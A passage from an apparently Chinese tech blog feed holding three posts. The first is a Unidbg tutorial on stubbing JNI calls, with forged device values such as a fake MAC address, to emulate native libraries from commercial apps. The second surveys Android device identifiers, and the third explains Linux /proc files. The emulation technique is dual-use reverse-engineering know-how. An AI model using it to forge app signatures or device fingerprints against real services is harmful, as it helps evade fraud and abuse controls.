com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>首先获取包名 <strong>String packgeName &#x3D; vm.getPackageName();</strong>，然后下面两种方案任选一种处理为 <strong>StringObject</strong></p><pre><code class="language-Java">StringObject stringObject1 = (StringObject) ProxyDvmObject.createObject(vm, packageName);StringObject stringObject2 = new StringObject(vm, packageName);</code></pre><p><strong>ProxyDvmObject.createObject</strong> 内部做了类型判断，将 String 转为 StringObject。</p><pre><code class="language-Java">if (value instanceof String) &#123;    return new StringObject(vm, (String) value);&#125;</code></pre><p>使用哪一种看个人喜好，我个人认为使用 StringObject构造更好，因为更直观。</p><ul><li>例二</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/Integer-&gt;&lt;init&gt;(I)Vat com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:789)at com.demo5.MeiTuan.newObjectV(MeiTuan.java:557)</code></pre><p>Integer 类是基本类型 <strong>int</strong> 所对应的包装类，Unidbg 对部分包装类做了处理，详见 <strong>com.github.unidbg.linux.android.dvm.wrapper</strong>。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250809172742114.png" alt="image-20250809172742114"></p><p>其中都提供了 <strong>valueOf</strong> 类方法做包装</p><pre><code class="language-Java">case &quot;java/lang/Integer-&gt;&lt;init&gt;(I)V&quot;: &#123;    int i = vaList.getIntArg(0);    return DvmInteger.valueOf(vm, i);&#125;</code></pre><ul><li>例三</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/net/NetworkInterface-&gt;getHardwareAddress()[Bat com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:921)at com.demo14.SimpleSign.callObjectMethod(SimpleSign.java:177)</code></pre><p><strong>[B</strong> 即 byte[]，在 Unidbg 中对应于 <strong>ByteArray</strong>。</p><pre><code class="language-Java">case &quot;java/net/NetworkInterface-&gt;getHardwareAddress()[B&quot;:    byte[] addr = new byte[]&#123;0x64, (byte) 0xBC, 0x0C, 0x65, (byte) 0xAA, 0x1E&#125;;return new ByteArray(vm, addr);</code></pre><p>在 com.github.unidbg.linux.android.dvm.array 包下有对各种基本类型数组的表示和处理。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250809173300521.png" alt="image-20250809173300521"></p><p>这里也可以用 <strong>ProxyDvmObject.createObject</strong>，就像 <strong>StringObject</strong> 一样，它内部会做对应处理。</p><pre><code class="language-Java">if (value instanceof byte[]) &#123;    return new ByteArray(vm, (byte[]) value);&#125;if (value instanceof short[]) &#123;    return new ShortArray(vm, (short[]) value);&#125;if (value instanceof int[]) &#123;    return new IntArray(vm, (int[]) value);&#125;if (value instanceof float[]) &#123;    return new FloatArray(vm, (float[]) value);&#125;if (value instanceof double[]) &#123;    return new DoubleArray(vm, (double[]) value);&#125;</code></pre><ul><li>例四</li></ul><pre><code class="language-Java">java.lang.UnsupportedOperationException: android/os/Build-&gt;SUPPORTED_ABIS:[Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.demo5.MeiTuan.getStaticObjectField(MeiTuan.java:629)</code></pre><p>类型是 <strong>[Ljava&#x2F;lang&#x2F;String;</strong> </p><table><thead><tr><th>Java类型</th><th>签名</th></tr></thead><tbody><tr><td>class</td><td>Lclass;</td></tr><tr><td>[ type</td><td>type[]</td></tr></tbody></table><p>对应上面的表，它是个对象数组，更具体的说是字符串数组。</p><p>在 Unidbg 中，对象数组通过 <strong>ArrayObject</strong> 表示，而且还为字符串数组提供了一个方便的处理函数。</p><pre><code class="language-Java">public static ArrayObject newStringArray(VM vm, String... strings) &#123;    StringObject[] objects = new StringObject[strings.length];    for (int i = 0; i &lt; strings.length; i++) &#123;        String str = strings[i];        if (str != null) &#123;            objects[i] = new StringObject(vm, str);        &#125;    &#125;    return new ArrayObject(objects);&#125;</code></pre><p>使用它可以方便的构造字符数组</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;SUPPORTED_ABIS:[Ljava/lang/String;&quot;:&#123;    return ArrayObject.newStringArray(vm, &quot;arm64-v8a&quot;, &quot;armeabi-v7a&quot;, &quot;armeabi&quot;);&#125;</code></pre><p>也可以使用 <strong>ProxyDvmObject.createObject</strong></p><pre><code class="language-java">case &quot;android/os/Build-&gt;SUPPORTED_ABIS:[Ljava/lang/String;&quot;:&#123;    String[] abis = new String[]&#123;&quot;arm64-v8a&quot;, &quot;armeabi-v7a&quot;, &quot;armeabi&quot;&#125;;    return ProxyDvmObject.createObject(vm, abis);&#125;</code></pre><p>它在内部最终也是转换为了 <strong>ArrayObject</strong></p><pre><code class="language-Java">Class&lt;?&gt; clazz = value.getClass();if (clazz.isArray()) &#123;    if (clazz.getComponentType().isPrimitive()) &#123;        throw new UnsupportedOperationException(String.valueOf(value));    &#125;    Object[] array = (Object[]) value;    DvmObject&lt;?&gt;[] dvmArray = new DvmObject[array.length];    for (int i = 0; i &lt; array.length; i++) &#123;        dvmArray[i] = createObject(vm, array[i]);    &#125;    return new ArrayObject(dvmArray);&#125;</code></pre><p>对于对象数组类型，我个人感觉用 <strong>ProxyDvmObject.createObject</strong> 更省事。</p><ul><li>例五</li></ul><pre><code class="language-Java">java.lang.UnsupportedOperationException: android/hardware/SensorManager-&gt;getSensorList(I)Ljava/util/List;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:416)at com.demo2.Tiny.callObjectMethodV(Tiny.java:334)</code></pre><p>这是一个 <strong>List</strong>，将它转成 <strong>ArrayListObject</strong>。</p><pre><code class="language-Java">case &quot;android/hardware/SensorManager-&gt;getSensorList(I)Ljava/util/List;&quot;:&#123;    int length = 10;    List&lt;DvmObject&lt;?&gt;&gt; SensorList = new ArrayList&lt;&gt;();    for (int i = 0; i &lt; length; i++) &#123;        SensorList.add(vm.resolveClass(&quot;android/hardware/Sensor&quot;).newObject(i));    &#125;    return new ArrayListObject(vm, SensorList);            &#125;</code></pre><h3 id="五、类型三"><a href="#五、类型三" class="headerlink" title="五、类型三"></a>五、类型三</h3><p>上一种类型，处理起来往往有两方面的选择，而除此之外其余的 JDK 类库，基本只能用 <strong>ProxyDvmObject.createObject</strong> 。</p><ul><li>例一</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/util/HashMap-&gt;&lt;init&gt;()Vat com.github.unidbg.linux.android.dvm.AbstractJni.newObject(AbstractJni.java:741)at com.demo4.TBSecurity.newObject(TBSecurity.java:392)</code></pre><p>HashMap 对象</p><pre><code class="language-Java">case &quot;java/util/HashMap-&gt;&lt;init&gt;()V&quot;:&#123;    return ProxyDvmObject.createObject(vm, new HashMap&lt;&gt;());&#125;</code></pre><ul><li>例二</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/util/zip/ZipFile-&gt;getInputStream(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:416)at com.demo7.TDJNI.callObjectMethodV(TDJNI.java:625)</code></pre><p>InputStream 对象</p><pre><code class="language-Java">case &quot;java/util/zip/ZipFile-&gt;getInputStream(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;&quot;:&#123;    ZipFile zipFile = (ZipFile) dvmObject.getValue();    try &#123;        return ProxyDvmObject.createObject(vm, zipFile.getInputStream((ZipEntry) vaList.getObjectArg(0).getValue()));    &#125; catch (IOException e) &#123;        e.printStackTrace();    &#125;&#125;</code></pre><ul><li>例三</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/util/Map-&gt;put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:922)at com.Bili.NativeLibrary.callObjectMethod(NativeLibrary.java:88)</code></pre><p>这里只知道是 Object，而不确定具体是字符串还是其他上面类型，使用 <strong>ProxyDvmObject.createObject</strong> 是好选择。</p><pre><code class="language-Java">case &quot;java/util/Map-&gt;put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;&quot;:&#123;    Map map = (Map) dvmObject.getValue();    Object key = varArg.getObjectArg(0).getValue();    Object value = varArg.getObjectArg(1).getValue();    return ProxyDvmObject.createObject(vm, map.put(key, value));&#125;</code></pre><h3 id="六、类型四"><a href="#六、类型四" class="headerlink" title="六、类型四"></a>六、类型四</h3><p>对于 Android FrameWork 类库中的对象和类，使用 <strong>resolveClass</strong> 创建对应的 <strong>DvmClass</strong> 和 <strong>DvmObject</strong> 比较好。</p><p>在 AbstractJNI 中可以看到大量的例子：</p><ul><li>例一</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/telephony/FtTelephonyAdapter-&gt;getFtTelephony(Landroid/content/Context;)Landroid/telephony/FtTelephony;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:503)at com.demo7.TDJNI.callStaticObjectMethodV(TDJNI.java:763)</code></pre><p>这显然是一个 Android 里的类库，没法在 Unidbg 中实际处理，只能用 <strong>resolveClass</strong> 占位。</p><pre><code class="language-Java">case &quot;android/telephony/FtTelephonyAdapter-&gt;getFtTelephony(Landroid/content/Context;)Landroid/telephony/FtTelephony;&quot;:&#123;    return vm.resolveClass(&quot;android/telephony/FtTelephony&quot;).newObject(null);&#125;</code></pre><ul><li>例二</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/Class-&gt;forName(Ljava/lang/String;)Ljava/lang/Class;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:503)at com.demo7.TDJNI.callStaticObjectMethodV(TDJNI.java:763)</code></pre><p><strong>Class.forName(className)</strong> 用于加载类，我们不确定所加载的类具体是样本自定义的类、Android 框架层类库、还是 JDK 中的标准库，这种情况里使用 resolveClass 是好办法。</p><pre><code class="language-Java">case &quot;java/lang/Class-&gt;forName(Ljava/lang/String;)Ljava/lang/Class;&quot;:&#123;    String className = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;Class-&gt;forName:&quot;+className);    return vm.resolveClass(className);&#125;</code></pre><ul><li>例三</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/IntentFilter-&gt;&lt;init&gt;(Ljava/lang/String;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:791)at com.demo7.TDJNI.newObjectV(TDJNI.java:826)</code></pre><p>这里要初始化 <strong>IntentFilter</strong>，同样的 Android 框架层的类库，只能做占位处理。</p><pre><code class="language-Java">case &quot;android/content/IntentFilter-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;:&#123;    String intent = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;IntentFilter:&quot;+intent);    return vm.resolveClass(&quot;android/content/IntentFilter&quot;).newObject(intent);&#125;</code></pre><p>可以注意到，这里的 <strong>newObject</strong> 没有传 <strong>null</strong>，而是把参数传递了进去，这是因为样本初始化了多个 <strong>IntentFilter</strong>，需要一个办法分辨不同的 <strong>IntentFilter</strong>，以及把初始化的内容传递到之后的函数中去。</p><h3 id="七、尾声"><a href="#七、尾声" class="headerlink" title="七、尾声"></a>七、尾声</h3><p>本篇讨论了补 JNI 环境在 “形式” 上的一般规则，需要注意并非没有特例，我们会在具体文章中做更多讨论。</p><h3 id="八、参考"><a href="#八、参考" class="headerlink" title="八、参考"></a>八、参考</h3><p><a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/hiiaukxvr2zuz5mb#H8AlN">Unidbg 的基本使用（五）</a></p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漫谈唯一设备 ID</title>
      <link href="/2025/08/05/%E6%BC%AB%E8%B0%88%E5%94%AF%E4%B8%80%E8%AE%BE%E5%A4%87ID/"/>
      <url>/2025/08/05/%E6%BC%AB%E8%B0%88%E5%94%AF%E4%B8%80%E8%AE%BE%E5%A4%87ID/</url>
      
        <content type="html"><![CDATA[<h1 id="漫谈唯一设备-ID"><a href="#漫谈唯一设备-ID" class="headerlink" title="漫谈唯一设备 ID"></a>漫谈唯一设备 ID</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​       近期在帮助公司测试不同品牌设备，同一设备不同纬度关于其唯一设备ID的变化。测试使用的项目是 GitHub 上的一个<a href="https://github.com/gzu-liyujiang/Android_CN_OAID?tab=readme-ov-file">开源项目</a> 。写了一个demo进行测试。为了更好的理解与测试，所以上网了解并学习了有关概念以及这方面行业动向。</p><p>​        设备 ID，简单来说就是一串符号（或者数字），用来映射现实种的硬件设备。如果这些符号和设备是一一对应的，则可称之为“唯一设备 ID（Unique Device Identifier）”。</p><p>​        然而不幸的是，对于 Android 平台而言，没有稳定的 API 可以让开发者获取到这样的设备 ID。开发者通常遇到这样的困境：随着项目的演进，越来越多的地方需要用到设备 ID；然而随着 Android 版本的升级，获取设备 ID 却越来越难了；加上 Android 平台碎片化的问题，获取设备 ID 之路，可以说是步履艰难。</p><hr><h3 id="二、设备-ID-的作用"><a href="#二、设备-ID-的作用" class="headerlink" title="二、设备 ID 的作用"></a>二、设备 ID 的作用</h3><p>关于设备 ID 的作用，大概可以分为下面几点：</p><ul><li>统计需求。统计需求是设备 ID 最常见的用途，包括DAU，MAU的统计，行为统计，广告激活统计。</li><li>业务需求。设备 ID 通常也用于业务种，比如结合行为统计做用户画像，以为用户提供个性化的服务，大家感受比较明显的就是新闻类和电商类的 APP 了。这类操作，有利有弊，仁者见仁智者见智。又如，定向推送，不一定是广告推送，错误修复，内测推送等也会用到设备 ID。还是一些和特定业务结合的用途，比如构造分布式 ID 等。</li><li>风控需求。设备 ID 还可用于防刷单，反作弊等。当然，风控需求仅靠设备 ID是无法完成的，通常需要简历一套反作弊系统。笔者在实习的工作岗位便是和这个有关。关于这方面的内容，难以一言以蔽之，这里不多做展开。</li></ul><hr><h3 id="三、获取设备-ID-的-API"><a href="#三、获取设备-ID-的-API" class="headerlink" title="三、获取设备 ID 的 API"></a>三、获取设备 ID 的 API</h3><p>获取设备标识的 API D屈指可数，而且或多或少都有一些问题。</p><p>常规的 API 有以下这些：</p><h4 id="IMEI"><a href="#IMEI" class="headerlink" title="IMEI"></a>IMEI</h4><p><strong>IMEI</strong> 本该是最理想的设备 ID，具备唯一性，恢复出厂设置不会变化（真正的设备相关）。然而，获取 IMEI 需要 <strong>READ_PHONE_STATE</strong> 权限，很麻烦。尤其是 Android 6.0 之后，这类权限需要动态申请，很多用户可能会选择拒绝授权。我每看到，有的 APP 不授权这个权限就无法使用，这可能会降低用户对 APP 的好感度。而且，Android 10.0 彻底禁止第三方应用获取设备的 IMEI，即使申请了 READ_PHONE_STATE 权限。所以，如果是新 APP，不建议用 IMEI 作为设备标识；如果已经使用 IMEI 作为标识，要赶紧做兼容工作了，尤其是做设备标识和 IMEI 的映射。</p><h4 id="设备序列号"><a href="#设备序列号" class="headerlink" title="设备序列号"></a>设备序列号</h4><p>通过 <strong>android.os.Build.SERIAL</strong> 获得，由厂商提供。如果厂商比较规范的话，设备序列号 + <strong>android.os.Build.MANUFACTURER</strong> 应该能唯一标识设备。但现实是并非所有厂商都按规范来，尤其是早期的设备。最致命的是，Android 8.0 以上，android.osBuild.SERIAL 总返回”unknow“；若要获取序列号，可调用 Build.getSerial()，但是需要申请 READ_PHONE_STATE 权限。到了 Android 10.0 以上，则和 IMEI 一样，也被禁止获取了。总的来说，设备序列号有点鸡肋：食之无味，弃之可惜。</p><h4 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h4><p>获取 MAC 地址也是越来越困难了，Android 6.0 以后通过 WifiManager 获取到的 MAC 将是固定的：02:00:00:00:00:00，再后来连读取 &#x2F;sys&#x2F;class&#x2F;net&#x2F;wlan0&#x2F;address 也获取不到了。</p><h4 id="Android-ID"><a href="#Android-ID" class="headerlink" title="Android_ID"></a>Android_ID</h4><p><strong>Android_ID</strong> 是获取门槛最低的，不需要任何权限，64bit 的取值范围，唯一性算是很好的了。但是不足之处也很明显：</p><ol><li><strong>刷机</strong>、<strong>root</strong>、<strong>恢复出厂设置</strong>等会使得 Android_ID 改变；</li><li>Android 8.0 之后，Android_ID 的规则发生了变化：<br>对于升级到 8.0 之前安装的应用，<strong>Android_ID</strong> 会保持不变。如果卸载后重新安装的话，<strong>Android_ID</strong> 将会改变。<br>对于安装在 8.0 系统的应用来说，<strong>Android_ID</strong> 根据应用签名和用户的不同而不同。<strong>Android_ID</strong>的唯一决定于应用签名、用户和设备三者的组合。</li></ol><p>两个规则导致的结果就是：</p><ul><li>第一，如果用户安装 APP 的设备是 8.0 以下，后来卸载了，升级到 8.0 之后又重装了应用， Android_ID 不一样；</li><li>第二，不同签名的 APP，获取到的 Android_ID 不一样。</li></ul><p>其中第二点可能对于广告联盟之类的有所影响。</p><p>还有就是，要排除非法 Android_ID，有些设备在某些版本的时候 Android_ID 是固定的，排除的方法除了上网检索之外，最好服务端能帮下忙。</p><p>例如，在插入服务器设备 ID 表的同时检测一下是否有重复的 Android_ID ，有的话重复量有多少，如果多的话给下报警。</p><h4 id="Widevine-ID"><a href="#Widevine-ID" class="headerlink" title="Widevine ID"></a>Widevine ID</h4><p>Widevine ID 是用于数字版权管理(DRM)的 Widevine 模块为每个设备分配的唯一标识符。Widevine ID 获取也是不需要权限的。但貌似有些鸡肋，可能为空，在一些设备上还可能造成卡死或者闪退。</p><h4 id="Pseudo-ID"><a href="#Pseudo-ID" class="headerlink" title="Pseudo ID"></a>Pseudo ID</h4><p>通常是在<strong>无法获取稳定的设备标识</strong>时，通过系统某些属性组合生成的一个“伪唯一”设备 ID。不是真正的设备 ID，而是一组<strong>设备属性拼接 + hash</strong> 得出的一种替代方案。</p><h4 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h4><p>GUID 是一种用于标识对象、设备、实体等的 128 位唯一的 ID，可用于分布式系统种生成不会重复的标记。它是 <strong>UUID</strong> 的一种实现标准，两者在大多数上下文中可以视为等价。</p><h4 id="Canvas-Fingerprint"><a href="#Canvas-Fingerprint" class="headerlink" title="Canvas Fingerprint"></a>Canvas Fingerprint</h4><p>目的是在不依赖 <strong>Cookie</strong>、<strong>LocalStorage</strong>、<strong>设备 ID</strong> 等传统手段的前提下，唯一标识用户的设备或浏览器。该 ID 的生成依赖于 <strong>字体渲染</strong>、<strong>图形抗锯齿</strong>、<strong>画布合成方式</strong>、<strong>驱动版本</strong>。但也正是因为这些因素导致即使是相同型号的设备，该值的输出也可能略不同，生成的 hash 也随之变化。</p><h4 id="OAID"><a href="#OAID" class="headerlink" title="OAID"></a>OAID</h4><p><strong>OAID</strong> 是中国 Android 生态中提出的一个用于替代设备唯一标识的方案，主要由 <strong>移动安全联盟</strong> 推出，目的是 在不侵犯用户隐私的前提下，实现设备标识和广告追踪功能，它的关键特性如下：</p><ul><li>匿名性。与设备和厂商绑定，但不关联真实用户身份；</li><li>可重置。用户可在设置中手动重置 OAID (如广告标识)</li><li>可关闭。用户选择关闭广告标识符，OAID 将不可用；</li><li>无需权限。不需要任何权限即可获取，适用于 Android 6.0+；</li><li>厂商实现。需要厂商系统预装支持 MSA SDK 或实现接口。</li></ul><h4 id="AAID"><a href="#AAID" class="headerlink" title="AAID"></a>AAID</h4><p><strong>AAID</strong> 是 Google 提供的用于广告和用户行为分析的设备标识符，目的是在保护用户隐私的前提下，实现对设备的匿名识别和广告追踪。主要特点：</p><ul><li>唯一性。每个设备唯一，用户可重置；</li><li>保护隐私安全。匿名且可由用户重置和限制；</li><li>不需要敏感权限。</li></ul><p><strong>国产系统需要安卓 Google Play Services 才能获取 AAID.</strong></p><h4 id="EMMCID"><a href="#EMMCID" class="headerlink" title="EMMCID"></a>EMMCID</h4><p><strong>EMMCID</strong> 是指设备中 <strong>eMMC 存储芯片的唯一标识符（CID，全称：Card Identification Number）</strong>，常被称作 <strong>eMMC CID</strong>。它是 <strong>eMMC 存储设备的硬件级别序列号</strong>，在Android 和其他嵌入式系统中，有时被用作设备唯一标识的一部分（尤其是在一些系统厂商、ROM厂商、反作弊或风控场景中）。</p><ul><li><p><strong>什么是 eMMC？</strong> 是一种内嵌式存储芯片，用于手机、平板等设备中，和 UFS 一样属于主存储芯片。</p></li><li><p><strong>EMMCID</strong> 是啥？</p></li><li><table><thead><tr><th>字段</th><th>长度</th><th>含义</th></tr></thead><tbody><tr><td>MID</td><td>8bit</td><td>Manufacturer ID（厂商）</td></tr><tr><td>OID</td><td>16bit</td><td>OEM&#x2F;Application ID</td></tr><tr><td>PNM</td><td>40bit</td><td>Product name（产品名）</td></tr><tr><td>PRV</td><td>8bit</td><td>Product revision</td></tr><tr><td>PSN</td><td>32bit</td><td>Product serial number</td></tr><tr><td>MDT</td><td>12bit</td><td>Manufacturing date</td></tr><tr><td>CRC</td><td>7bit</td><td>校验位</td></tr></tbody></table></li></ul><h4 id="VAID"><a href="#VAID" class="headerlink" title="VAID"></a>VAID</h4><p>是 Android 设备标识体系中的一个标识符，它属于 中国移动智能终端联盟 推出的一套设备唯一标准体系，和 OAID、AAID、UDID 并列，用于用户身份识别与广告归因场景中。是 MSA 标准中定义的面向厂商应用的广告标识符，**由设备系统提供，对同一设备 + 同一厂商下的应用是相同的，而对其他厂商应用不可见。**特点总结：</p><ul><li>设备唯一性。同一设备、同一厂商下的应用拿到的 <strong>VAID</strong> 是一样的；</li><li>厂商隔离。不同厂商 App 拿到不同 VAID（即便同设备）；</li><li>隐私合规。用户可重置，也可关闭广告追踪权限；</li><li>不可跨厂商跟踪。防止广告平台在不同厂商 App 之间追踪用户行为。</li></ul><h3 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h3><ul><li>对移动设备ID标识合规要求的梳理与思考<br><a href="https://www.secrss.com/articles/44392">https://www.secrss.com/articles/44392</a></li><li>浅谈设备指纹技术和应用<br><a href="https://mp.weixin.qq.com/s/XAGQl8rk4E-JFJYefIHqKg">https://mp.weixin.qq.com/s/XAGQl8rk4E-JFJYefIHqKg</a></li><li>漫谈唯一设备ID<br><a href="https://juejin.cn/post/6844903952148856839">https://juejin.cn/post/6844903952148856839</a></li><li>Android O 中对设备标识符所做的变更<br><a href="https://googledeveloperschina.blogspot.com/2017/04/android-o.html">https://googledeveloperschina.blogspot.com/2017/04/android-o.html</a></li><li>OAID 集成教程<br><a href="https://juejin.cn/post/7072741392178479140">IMEI 弃用！收下这份保姆级的 OAID 集成教程国家相关部委成立了移动安全联盟 MSA，制定了一套《移动智能终端补充 - 掘金</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 Linux 系统下 proc 文件系统内容</title>
      <link href="/2025/07/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20Linux%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%20proc%20%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"/>
      <url>/2025/07/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20Linux%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%20proc%20%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈-Linux-系统下-proc-文件系统内容"><a href="#浅谈-Linux-系统下-proc-文件系统内容" class="headerlink" title="浅谈 Linux 系统下 proc 文件系统内容"></a>浅谈 Linux 系统下 proc 文件系统内容</h1><h3 id="一、内容摘要"><a href="#一、内容摘要" class="headerlink" title="一、内容摘要"></a>一、内容摘要</h3><p>Linux 系统上的 &#x2F;proc 目录是一种文件系统，即 proc 文件系统</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p>​        Linux 系统上的 &#x2F;proc 目录是一种文件系统，即 proc 文件系统。与其他常见的文件系统不同的是，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>​        基于 &#x2F;proc 文件系统如上所述的特殊性，其内的文件也常被称作虚拟文件，并具有一些独特的特点。例如，其中有些文件虽然使用查看命令查看时会返回大量信息，但文件本身的大小却会显示为 0 字节。此外，这些特殊文件中大多数文件的时间以及日期属性通常为当前系统时间和日期，这跟它们随时会被刷新（存储于 RAM 中）有关。</p><p>​        为了查看以及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如 &#x2F;proc&#x2F;scsi 目录中存储的就是当前系统上所有 SCSI 设备的相关信息，&#x2F;proc&#x2F;N 中存储的则是系统当前正在运行的进程和相关信息，其中 N 为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。</p><p>​        大多数虚拟文件可以使用文件查看命令如 cat、more 或者 less 进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如 apm、free、lspci 或 top 查看时却可以有着不错的表现。</p><h4 id="一、进程目录中的常见文件介绍"><a href="#一、进程目录中的常见文件介绍" class="headerlink" title="一、进程目录中的常见文件介绍"></a>一、进程目录中的常见文件介绍</h4><p>​       &#x2F;proc目录中包含许多<strong>以数字命名</strong>的子目录，这些数字表示系统当前正在运行进程的进程号，里面包含对应进程相关的多个信息文件。</p><pre><code class="language-shell">┌──(root㉿NshIdE)-[/home/nshide-kali]└─# ll /proctotal 0dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 1dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 10dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 13dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 14dr-xr-xr-x  9 nshide-kali nshide-kali               0 Jul 24 17:35 15dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 31dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 35dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 36dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 38dr-xr-xr-x  9 root        root                      0 Jul 24 17:35 41</code></pre><p>上面列出的是 &#x2F;proc 目录中一些进程相关的目录，每个目录是对应进程相关信息的文件。下面是作者系统（Kali）上运行的一个 PID 为 38 的进程 saslauthd 的相关文件，其中有些文件是每个进程都会具有的，后文会对这些常见文件做出说明。</p><pre><code class="language-shell">┌──(root㉿NshIdE)-[/home/nshide-kali]└─# ll /proc/38total 0-r--r--r--  1 root root 0 Jul 24 17:38 arch_statusdr-xr-xr-x  2 root root 0 Jul 24 17:38 attr-r--------  1 root root 0 Jul 24 17:38 auxv-r--r--r--  1 root root 0 Jul 24 17:38 cgroup--w-------  1 root root 0 Jul 24 17:38 clear_refs-r--r--r--  1 root root 0 Jul 24 17:38 cmdline-rw-r--r--  1 root root 0 Jul 24 17:38 comm-rw-r--r--  1 root root 0 Jul 24 17:38 coredump_filter-r--r--r--  1 root root 0 Jul 24 17:38 cpusetlrwxrwxrwx  1 root root 0 Jul 24 17:38 cwd -&gt; /home/nshide-kali-r--------  1 root root 0 Jul 24 17:38 environlrwxrwxrwx  1 root root 0 Jul 24 17:38 exe -&gt; /usr/bin/bashdr-x------  2 root root 0 Jul 24 17:38 fddr-xr-xr-x  2 root root 0 Jul 24 17:38 fdinfo-rw-r--r--  1 root root 0 Jul 24 17:38 gid_map-r--------  1 root root 0 Jul 24 17:38 io-r--r--r--  1 root root 0 Jul 24 17:38 limits-rw-r--r--  1 root root 0 Jul 24 17:38 loginuiddr-x------  2 root root 0 Jul 24 17:38 map_files-r--r--r--  1 root root 0 Jul 24 17:38 maps-rw-------  1 root root 0 Jul 24 17:38 mem-r--r--r--  1 root root 0 Jul 24 17:38 mountinfo-r--r--r--  1 root root 0 Jul 24 17:38 mounts-r--------  1 root root 0 Jul 24 17:38 mountstatsdr-xr-xr-x 65 root root 0 Jul 24 17:38 netdr-x--x--x  2 root root 0 Jul 24 17:38 ns-rw-r--r--  1 root root 0 Jul 24 17:38 oom_adj-r--r--r--  1 root root 0 Jul 24 17:38 oom_score-rw-r--r--  1 root root 0 Jul 24 17:38 oom_score_adj-r--------  1 root root 0 Jul 24 17:38 pagemap-r--------  1 root root 0 Jul 24 17:38 personality-rw-r--r--  1 root root 0 Jul 24 17:38 projid_maplrwxrwxrwx  1 root root 0 Jul 24 17:38 root -&gt; /-rw-r--r--  1 root root 0 Jul 24 17:38 sched-r--r--r--  1 root root 0 Jul 24 17:38 schedstat-r--r--r--  1 root root 0 Jul 24 17:38 sessionid-rw-r--r--  1 root root 0 Jul 24 17:38 setgroups-r--r--r--  1 root root 0 Jul 24 17:38 smaps-r--r--r--  1 root root 0 Jul 24 17:38 smaps_rollup-r--------  1 root root 0 Jul 24 17:38 stack-r--r--r--  1 root root 0 Jul 24 17:38 stat-r--r--r--  1 root root 0 Jul 24 17:38 statm-r--r--r--  1 root root 0 Jul 24 17:38 status-r--------  1 root root 0 Jul 24 17:38 syscalldr-xr-xr-x  3 root root 0 Jul 24 17:38 task-rw-r--r--  1 root root 0 Jul 24 17:38 timens_offsets-r--r--r--  1 root root 0 Jul 24 17:38 timers-rw-rw-rw-  1 root root 0 Jul 24 17:38 timerslack_ns-rw-r--r--  1 root root 0 Jul 24 17:38 uid_map-r--r--r--  1 root root 0 Jul 24 17:38 